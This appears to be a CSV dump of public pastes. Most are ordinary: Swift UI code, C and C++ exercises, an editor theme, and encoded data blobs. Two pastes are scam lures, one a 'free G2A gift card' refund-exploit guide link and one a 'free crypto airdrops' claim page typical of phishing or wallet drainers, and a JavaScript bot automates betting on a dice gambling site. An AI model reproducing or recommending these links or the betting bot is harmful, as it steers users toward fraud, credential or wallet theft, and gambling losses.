id,title,username,language,date,content
MNEr6nuB,data831,TestGuy1,JSON,Monday 5th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '79ce92aa85c56a36146dbab6b263fc27f33590690a772abf6b7d7b873f5a6a2ae7788566d2a2d63243584814dd3842ebc3e9bd507e95db65cb90e65891a6293013347780dc690e8b757f071ed928ce98687f4e8d9d0883f9eb6d46f14d325ed969eb0579645ee03ab28950665cfda5e80d52c50b6108515d2320bf5ba8c6ff90',
  otherdata: [
    '93e120bc27185610313e64f6f2af4240',
    'ae201bbe2940cf2fd0fbe0f20f5b55fd',
    '99fde1bc06475b16a2565aadb8a09122',
    '37edd381b1a10474a8a437f8b6039b76',
    '7b93480e759009a1c195679dc17426a3',
    '4ca61e08ce668f29b0722e3115efe8f5',
    '84cc34fa6f416d0fa23f32c375fc5aed',
    '01edca0300308dd7db5b0e96118029ae'
  ]
}"
gEgap75Y,ArtistTVC2.swift,Wolverine_X-Man,Swift,Monday 5th of February 2024 05:59:48 AM CDT,"//
//  ArtistTVC.swift
//  hubble-ios
//
//  Created by Chandan Chandan on 11/06/23.
//

import UIKit

class ArtistTVC: UITableViewCell {
    private lazy var mainBgView: UIView = {
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.backgroundColor = .clear
        view.corner(cornerRadius: 12)
        return view
    }()
    private lazy var bgImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = UIImage(named: ""cellbg"")
        imageView.isUserInteractionEnabled = true
        imageView.backgroundColor = .clear
        return imageView
    }()
    private lazy var cellTypeNameLabel: UILabel = {
        let label = UILabel()
        label.text = ""artist_home_artst"".myLocalizedString
        label.textAlignment = .center
        label.isUserInteractionEnabled = true
        label.textColor = .white
        label.backgroundColor = .color111111Alpha6
        label.corner(cornerRadius: 8.0)
        label.font = .fontRegular16
        return label
    }()
    private lazy var cellTypeNameLabelBgView: UIView = {
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.addSubview(cellTypeNameLabel)
        cellTypeNameLabel.snp.makeConstraints { make in
            make.center.equalTo(view)
        }
        return view
    }()
    lazy var bookmarkedImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.tintColor = .white
        imageView.isUserInteractionEnabled = true
        let tap = UITapGestureRecognizer(target: self, action: #selector(saveStarButtonTapped(_:)))
        imageView.addGestureRecognizer(tap)
        return imageView
    }()
    private lazy var detailBgView: UIView = { // details
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.backgroundColor = .color111111Alpha6
        return view
    }()
    private lazy var reatingsStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [ratingsTextlabel, reatingStarImageView])
        reatingStarImageView.snp.makeConstraints { make in
            make.width.equalTo(20)
        }
        stack.isUserInteractionEnabled = true
        stack.axis = .horizontal
        stack.spacing = 2
        stack.distribution = .fill
        stack.alignment = .fill
        return stack
    }()
    private lazy var ratingsTextlabel: UILabel = {
        let label = UILabel()
        label.textColor = .white
        label.isUserInteractionEnabled = true
        label.font = .fontLight14
        return label
    }()

    lazy var nameStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [artistName, artistUserName])
        stack.axis = .vertical
        stack.spacing = 6
        stack.isUserInteractionEnabled = true
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var artistName: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var artistUserName: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontRegular14
        return label
    }()
//    private lazy var priceLocationValueTextStack: UIStackView = {
//        let stack = UIStackView(arrangedSubviews: [priceLocationTextStack, priceLocationValueStack])
//        stack.axis = .horizontal
//        stack.isUserInteractionEnabled = true
//        stack.alignment = .leading
//        stack.distribution = .fillEqually
//        return stack
//    }()
    private lazy var priceTextAndValueStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [priceText, priceValue])
        stack.axis = .vertical
        stack.isUserInteractionEnabled = true
        stack.spacing = 6
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var locationTextAndValueStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [locationText, locationValue])
        stack.axis = .vertical
        locationText.snp.makeConstraints { make in
            make.height.equalTo(10)
        }
        locationValue.snp.makeConstraints { make in
            make.left.equalTo(-2)
        }
        stack.isUserInteractionEnabled = true
        stack.spacing = 6
        stack.alignment = .fill
        stack.distribution = .fill
        return stack
    }()
    private lazy var priceText: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.text = ""artist_home_price"".myLocalizedString
        label.font = .fontRegular14
        return label
    }()
    private lazy var priceValue: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var locationText: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.text = ""artist_home_location"".myLocalizedString
        label.font = .fontRegular14
        return label
    }()
    private lazy var locationValue: UITextView = {
        let label = UITextView()
        label.isUserInteractionEnabled = false
        label.isEditable = false
        label.setPadding(top: .zero, left: .zero, bottom: .zero, right: .zero)
        label.backgroundColor = .clear
        label.textAlignment = .left
        label.font = .fontBold14
        return label
    }()
    private lazy var reatingStarImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = .saveStarFill
        imageView.isUserInteractionEnabled = true
        imageView.tintColor = .yellow
        return imageView
    }()
    lazy var cellNextButton: UIButton = {
        let button = UIButton()
        button.isUserInteractionEnabled = true
        button.setImage(.arrowRight, for: .normal)
        button.tintColor = .white
        button.backgroundColor = .colorWhiteAlpha3
        button.corner(cornerRadius: 6.0)
        button.addTarget(self, action: #selector(nextButtonTapped), for: .touchUpInside)
        return button
    }()

    var starButtonHandler: ((_ index: Int) -> Void)?
    var cellNextButtonHandler: (() -> Void)?

    override func awakeFromNib() {
        super.awakeFromNib()
        // Initialization code
    }

    override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {
        super.init(style: style, reuseIdentifier: reuseIdentifier)
        setupUi()
    }

    required init?(coder: NSCoder) {
        fatalError(""init(coder:) has not been implemented"")
    }

    override func setSelected(_ selected: Bool, animated: Bool) {
        super.setSelected(selected, animated: animated)
        // Configure the view for the selected state
    }

    func setupCell(data: HomeArtistModal, index: Int) {
        self.cellTypeNameLabel.text = data.userType
        self.bgImageView.image = .artistBgImage // download image with SD Web Image
        let fullName = data.showLastName ?? true ? ""\(data.firstName  ?? K.emptyString) \(data.lastName ?? K.emptyString)"" : data.firstName ?? K.emptyString
        self.artistName.text = fullName
        self.cellNextButton.accessibilityElement(id: AccessIdentifier.artistHomeTVCNextButton + ""\(index)"", label: AccessLabel.artistHomeTVCNextButton.replaceString(with: fullName))
        self.bookmarkedImageView.image = data.isSaved ?? false ? UIImage.saveStarFill : UIImage.unSaveStar
        self.setAccessibilityOfSaveButton(data: data, index: index)
        self.bookmarkedImageView.tag = index
        self.artistName.accessibilityElement(id: AccessIdentifier.artistHomeTVCName + ""\(index)"", label: AccessLabel.artistHomeTVCName.replaceString(with: fullName ))
        self.artistUserName.text = data.userName
        self.artistUserName.accessibilityElement(id: AccessIdentifier.artistHomeTVCUserName + ""\(index)"", label: AccessLabel.artistHomeTVCUserName.replaceString(with: data.userName ?? K.emptyString))
        self.priceValue.text = ""$\(data.price ?? .zero)""
        self.priceValue.accessibilityElement(id: AccessIdentifier.artistHomeTVCPrice + ""\(index)"", label: AccessLabel.artistHomeTVCPrice.replaceString(with: ""$\(data.price ?? .zero)""))
        self.locationValue.text = ""chandan rahul chandan rahul chandan rahul chandan rahul chandan rahul""
        self.artistUserName.accessibilityElement(id: AccessIdentifier.artistHomeTVCLocation + ""\(index)"", label: AccessLabel.artistHomeTVCLocation.replaceString(with: data.primaryLocation?.address ?? K.emptyString))
        let ratingStar = data.rating ?? 0.0
        if ratingStar < 0.5 {
            self.reatingsStack.isHidden = true
        } else {
            self.ratingsTextlabel.text = String(data.rating ?? .zero)
            self.reatingsStack.isHidden = false
        }
        self.ratingsTextlabel.accessibilityElement(id: AccessIdentifier.artistHomeTVCReating + ""\(index)"", label: AccessLabel.artistHomeTVCReating.replaceString(with: data.rating ?? K.emptyString))
    }

    @objc func nextButtonTapped(_ sender: UIButton) {
        if let block = cellNextButtonHandler {
            block()
        }
    }

    func setAccessibilityOfSaveButton(data: HomeArtistModal, index: Int) {
        if !(data.isSaved ?? false) {
            bookmarkedImageView.accessibilityElement(id: AccessIdentifier.artistHomeTVCSaveButton + ""\(index)"", label: AccessLabel.artistHomeTVCSaveButton.replaceString(with: data.userName ?? K.emptyString))
        } else {
            bookmarkedImageView.accessibilityElement(id: AccessIdentifier.artistHomeTVCUnSaveButton + ""\(index)"", label: AccessLabel.artistHomeTVCUnSaveButton.replaceString(with: data.userName ?? K.emptyString))
        }
    }

    @objc func saveStarButtonTapped(_ tapGestureRecognizer: UITapGestureRecognizer) {
        guard let tappedImage = tapGestureRecognizer.view as? UIImageView else { return }
        if let block = starButtonHandler {
            block(tappedImage.tag)
        }
    }

    lazy var artistProfileImage: UIImageView = {
        let imageView = UIImageView(isImageViewerEnable: true)
        imageView.image = UIImage(named: ""ratingDemoProfile"")
        imageView.corner(cornerRadius: 30)
        imageView.accessibilityElement(id: AccessIdentifier.artistPersonalInfoProfileImage, label: AccessLabel.artistPersonalInfoProfileImage)
        imageView.contentMode = .scaleAspectFill
        return imageView
    }()

    private func setupUi() {
        self.contentView.isUserInteractionEnabled = true
        self.contentView.backgroundColor = .primaryColor
        
        self.contentView.addSubview(mainBgView)
        mainBgView.addSubview(bgImageView)
        bgImageView.addSubview(artistProfileImage)
        detailBgView.addSubview(cellTypeNameLabel)
        detailBgView.addSubview(bookmarkedImageView)
        bgImageView.addSubview(detailBgView)
        bgImageView.addSubview(reatingsStack)
        bgImageView.addSubview(nameStack)
        detailBgView.addSubview(cellNextButton)
        detailBgView.addSubview(priceTextAndValueStack)
        detailBgView.addSubview(locationTextAndValueStack)

        
        mainBgView.snp.makeConstraints { make in
            make.top.equalTo(self.contentView.snp.top)
            make.bottom.equalTo(self.contentView.snp.bottom)
            make.left.equalTo(self.contentView.snp.left)
            make.right.equalTo(self.contentView.snp.right)
        }
        artistProfileImage.snp.makeConstraints { make in
            make.left.equalTo(bgImageView.left).offset(leftOffset)
            make.top.equalTo(bgImageView.top).offset(10)
            make.height.width.equalTo(60)
        }
        bgImageView.snp.makeConstraints { make in
            make.top.bottom.left.right.equalTo(mainBgView)
        }
        bookmarkedImageView.snp.makeConstraints { make in
            make.top.equalTo(bgImageView.snp.top).offset(14)
            make.right.equalTo(bgImageView.snp.right).inset(7)
            make.height.width.equalTo(24)
        }
        cellTypeNameLabel.snp.makeConstraints { make in
            make.right.equalTo(bookmarkedImageView.left).inset(-12)
            make.top.equalTo(bgImageView.snp.top).offset(10)
            make.width.equalTo(78)
            make.height.equalTo(28)
        }
        reatingsStack.snp.makeConstraints { make in
            make.top.equalTo(artistProfileImage.bottom).offset(4)
            make.centerX.equalTo(artistProfileImage)
            make.width.equalTo(44)
            make.height.equalTo(16)
        }
        nameStack.snp.makeConstraints { make in
            make.top.equalTo(reatingsStack.bottom).offset(8)
            make.left.equalTo(artistProfileImage.left)
            make.width.equalTo(96)
        }
        detailBgView.snp.makeConstraints { make in
            make.top.right.bottom.equalTo(bgImageView)
            make.left.equalTo(artistProfileImage.right).offset(32)
        }
        cellNextButton.snp.makeConstraints { make in
            make.height.width.equalTo(32)
            make.right.equalTo(detailBgView.snp.right).inset(10)
            make.centerY.equalTo(detailBgView)
        }
        priceTextAndValueStack.snp.makeConstraints { make in
            make.top.equalTo(detailBgView.top).offset(44)
            make.left.equalTo(detailBgView.left).offset(leftOffset)
            make.height.equalTo(50)
            make.width.equalTo(100)
        }
        locationTextAndValueStack.snp.makeConstraints { make in
            make.top.equalTo(priceTextAndValueStack.bottom).offset(topOffset)
            make.left.equalTo(detailBgView.left).offset(leftOffset)
            make.right.equalTo(detailBgView.right).inset(24)
            make.height.equalTo(52)
        }
    }
}
"
v46EXt4R,02. The Matrix,Spocoman,C++,Monday 5th of February 2024 05:55:16 AM CDT,"#include <iostream>
#include <vector>
#include <cmath>

using namespace std;

bool isPrime(int n) {
    for (int i = 2; i <= sqrt(n); i++) {
        if (n % i == 0) {
            return false;
        }
    }
    return true;
}

int main() {
    int n;
    cin >> n;

    vector<vector<int>> numbers(n, vector<int>(n));

    for (int r = 0; r < n; r++) {
        for (int c = 0; c < n; c++) {
            cin >> numbers[r][c];
        }
    }

    int startCol = 1, finalCol = n - 1, sum = 0;

    for (int r = n - 1; r > n / 2; r--) {
        for (int c = startCol; c < finalCol; c++) {
            if (isPrime(numbers[r][c])) {
                sum += numbers[r][c];
            }
        }
        startCol++;
        finalCol--;
    }

    cout << sum << endl;
    return 0;
}"
7z0GJGSq,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Monday 5th of February 2024 05:36:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_705980.pdf
 
Working as of
05 February 2024"
NnzhBZam,CSV color,OilCastle,JSON,Monday 5th of February 2024 05:27:53 AM CDT,"            {
                ""scope"": ""rainbow1"",
                ""settings"": {
                    ""foreground"": ""#FF0000"",
                    // ""fontStyle"": ""bold"",
                    // ""fontStyle"": ""italic"",
                    // ""fontStyle"": ""underline"",
                    // ""fontStyle"": ""bold italic"",
                    // ""fontStyle"": ""italic underline"",
                    // ""fontStyle"": ""bold underline"",
                    // ""fontStyle"": ""bold italic underline"",
                }
            },
            {
                ""scope"": ""keyword.rainbow2"",
                ""settings"": {
                    ""foreground"": ""#00FF00""
                }
            },
            {
                ""scope"": ""entity.name.function.rainbow3"",
                ""settings"": {
                    ""foreground"": ""#0000FF"",
                }
            },
            {
                ""scope"": ""comment.rainbow4"",
                ""settings"": {
                    ""foreground"": ""#FFFF00"",
                }
            },
            {
                ""scope"": ""string.rainbow5"",
                ""settings"": {
                    ""foreground"": ""#00FFFF"",
                }
            },
            {
                ""scope"": ""variable.parameter.rainbow6"",
                ""settings"": {
                    ""foreground"": ""#FF00FF""
                }
            },
            {
                ""scope"": ""constant.numeric.rainbow7"",
                ""settings"": {
                    ""foreground"": ""#FFA500"",
                }
            },
            {
                ""scope"": ""entity.name.type.rainbow8"",
                ""settings"": {
                    ""foreground"": ""#964B00"",
                }
            },
            {
                ""scope"": ""markup.bold.rainbow9"",
                ""settings"": {
                    ""foreground"": ""#FF007F""
                }
            },
            {
                ""scope"": ""invalid.rainbow10"",
                ""settings"": {
                    ""foreground"": ""#FFFFFF"",
                }
            }
        ]
    },"
411a54JV,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Monday 5th of February 2024 05:07:09 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://claim-netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://claim-netdrop.netlify.app/

651083"
6ttkDR7g,upgrade snowybot 2000,coinwalk,JavaScript,Monday 5th of February 2024 05:02:40 AM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/200).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var nobil = (((Math.floor(original/tens))*tens)-tens);
var mighty = (hectic*blast);
var dager = original;
var wonsy = 0;
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if (bilance>dager){
wonsy = wonsy+1;
dager = parseFloat(bilance);
}
if (bilance<dager){
dager = parseFloat(bilance);
}
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)&&(bilance<bob)&&(bilance>nobil)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
     nobil = parseFloat(bilance);
} 
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)&&(bilance>bob)&&(bilance>nobil)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    mighty = (hectic*blast);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
    nobil = (((Math.floor(bilance/tens))*tens)-tens);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
if ((wonsy>=3)&&(wonsy<=6)){
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_hi').click();
}
if (wonsy<=2){
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
}
if (wonsy>=7){
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
wonsy = 0
}
setTimeout(() => dobet(), 1000);
} 
dobet();
"
6VJ8Pgap,Calculadora com polimorfismo em tempo de execução em C++,jacknpoe,C,Monday 5th of February 2024 05:00:16 AM CDT,"#include <stdio.h>
#include <locale.h>

double soma(double num1, double num2) { return num1 + num2; }
double subtracao(double num1, double num2) { return num1 - num2; }
double multiplicacao(double num1, double num2) { return num1 * num2; }
double divisao(double num1, double num2) { return num1 / num2; }

int main() {
	double numero1, numero2;
	int operacaoSelecionada;

	double (*operacoes[4]) (double num1, double num2);
	operacoes[0] = soma;
	operacoes[1] = subtracao;
	operacoes[2] = multiplicacao;
	operacoes[3] = divisao;
	
	setlocale( LC_ALL, """");		// caracteres acentuados

	printf(""Escolha uma operação: 0: adição, 1: subtração, 2: multiplicação, 3: divisão: "");
	scanf(""%i"", &operacaoSelecionada);
	if(operacaoSelecionada < 0 || operacaoSelecionada > 3) {
		printf(""Operação incorreta!\n"");
		return -1;
	}

	printf(""Número 1: "");
	scanf(""%lf"", &numero1);

	printf(""Número 2: "");
	scanf(""%lf"", &numero2);
	
	printf(""Resultado: %f\n"", (*operacoes[operacaoSelecionada])(numero1, numero2));
}"
Sk0qSn7Z,Untitled,ekzolot,C++,Monday 5th of February 2024 04:58:05 AM CDT,"#include <bits/stdc++.h>
#define int long long
using namespace std;
vector<int> powers(int p, int n, int mod){
    vector<int> q(n+1);
    q[0]=1;
    for (int i=1; i<=n; i++){
        q[i]=q[i-1]*p;
        q[i]%=mod;
    }
    return q;
}

vector<int> hash_function(int p, int mod, string s){
    int n = (int) s.size();
    vector<int> h(n+1);
    for (int i=1; i<=n; i++){
        h[i]=h[i-1]*p+s[i-1];
        h[i]%=mod;
    }
    return h;
}
int hash_func(int mod, vector<int>& h, vector<int>& q, int l, int r){
    int x=h[r]-h[l]*q[r-l];
    x=((x%mod)+mod)%mod;
    return x;
}
int res(int mod, vector<int>& q, string s, int result, int i, char x){
    int n=(int) s.size();
    int cur=result;
    cur-=s[i]*q[n-1-i];
    cur+=x*q[n-1-i];
    cur=(cur%mod+mod)%mod;
    return cur;
}
signed main(){
    int mod1=1000000007;
    int mod2=1000000009;
    int p=228;
    string s, t;
    cin>>s>>t;
    int n=(int) s.size();
    int m=(int) t.size();
    vector<int> q1=powers(p, m, mod1);
    vector<int> q2=powers(p, m, mod2);
    vector<int> h1= hash_function(p, mod1, t);
    vector<int> h2= hash_function(p, mod2, t);
    unordered_set<int> pos1;
    unordered_set<int> pos2;
    int result1=0;
    int result2=0;
    for (int i=0; i<n; i++){
        result1+=s[i]*q1[n-1-i];
        result2+=s[i]*q2[n-1-i];
        result1%=mod1;
        result2%=mod2;
    }
    pos1.insert(result1);
    pos2.insert(result2);
    for (int i=0; i<n; i++){
        for (char x='A'; x<='Z'; x++){
            pos1.insert(res(mod1, q1, s, result1, i, x));
            pos2.insert(res(mod2, q2, s, result2, i, x));
        }
        for (char x='a'; x<='z'; x++){
            pos1.insert(res(mod1, q1, s, result1, i, x));
            pos2.insert(res(mod2, q2, s, result2, i, x));
        }
    }
    vector<int> ans;
    for (int i=0; i<=m-n; i++){
        if (pos1.count(hash_func(mod1, h1, q1, i, i+n)) && pos2.count(hash_func(mod2, h2, q2, i, i+n))){
            ans.push_back(i+1);
        }
    }
    cout<<ans.size()<<""\n"";
    for (int x:ans){
        cout<<x<<"" "";
    }
    return 0;
}"
nSnkwv0b,MegaTun,SilverProKingM,JSON,Monday 5th of February 2024 04:06:12 AM CDT,qXViTxXMMa3uWDKbQPtvO07URATgpHKuQOdTwivKtiP4ivDTVaJGcIKDpKWoCPzDWqN53vfAvSw6Mj2Qmqa9IV/eT7a45E70HZnqlqmRsT/8Pg9dWqjFkQE7oHknyJoWy+zcHLA74/wiHC7+88JDA32DU8iqGL96mnbuuuwFAhqh3akxDgZSbW6R9xq4boQIn1xtxQcqCOD69NSLKJ3wklzL2s/j2Xz9yo4MC7hEiwWgmBcHMbR8r3+WJmb2MnwzsakgvmxOlmqiG9SRnoZirCJphdJLahtN7+SCGMFOSsp91uGlmxLuAAqLHPhSWQ4llvWnAmKRC2XlcmpoPV5vC10CUKCYyFbIn8/mLBXBaW7CzCFifobjeZ3vmM6qDb8axL2oAVodj5O3BdrOfZnX8I+xMIZZ8yIheQQncYRKjyg7HVYl8wYFGXHRZtNN7UYfToecHVYtFNC6Qw23SwHzW+QPDrO3bnG/HcgGAhL213am3n/j6T7pHAiSCJzTvQo9ZuXLxwM5B+SFsXNzdcYy724dAFbVHN0JF5T3GTpA2diInZyOKWFDuCq1b5Vlj8EHfq+CHKO2fr7steNrLM6AuskHrhtb5kVbjU09f6sx8h4YfyDS1tIrdEpd+4U5z8XjqTCixRaUKyHmMQlVXs3kJTQqLKD+8+04UfavFy0ckdyXGuiWuTQV1tRH2Uru20LX1q13qpYXIYwwCqkLYnyATzajDL4G/AM2bxkNPGF3+ILD1Ex2EGCOzvA/S/FNR4kCPAbQOoUy9XUopQdkvUGRmK3RJrPpGLqY9CBkYO69YbprQuCxiXn/YQYVrSO0/TGCOfEu6nZ7HxRFDW6ykb/i1zS0nLthcJi2yPZ5eLsb79ulVMOQ0PMgTA9N6LK9ecjBt61nYr+Z0iiSNb4A1ZtsBauS0f9Yz02gXaQE67BX559upluPI4p/QPTEKOyP0aHjFpJNj6vrM+VhS2+zY8mE9iYSKdmokjnxkt69J1z9lOhvDF28pXNt3rf22NNCGwyFWNZE82zL0TBsfa2Oxrja0lLJcd1c8RUktM6ImLclUaUrSwzIwK5aI3vX2jBkQJcpofru9G4NGHnJV8hyac+JU+AzvA0iQX7U6ABV7Nh/qiKEpObK7IJkO0iSgUtF+DxJR/nbzXjXeIZE/qfA9qIRMQQZRrX54zB1Sc20wuCq4mElTPTwuuVKi91w7ZIR2tbTLWGzyw==
